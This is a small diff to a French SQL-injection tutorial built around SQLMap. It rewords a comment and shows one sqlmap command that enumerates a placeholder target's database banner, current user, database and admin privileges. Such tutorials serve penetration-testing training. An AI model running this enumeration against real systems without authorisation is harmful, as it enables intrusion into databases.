@@ -22,7 +22,7 @@ Ce mécanisme est transparent : il suffit de passer le bon switch pour que SQLMa
 Les premiers réflexes après confirmation de l'injection : identifier la version du SGBD, l'utilisateur courant, la base active et les privilèges.
 
 ```bash
-# Depuis Exegol - recuperation des infos de base
+# Depuis votre machine d'attaque - recuperation des infos de base
 sqlmap -u "http://<IP_CIBLE>/page.php?id=1" --banner --current-user --current-db --is-dba
 ```
 
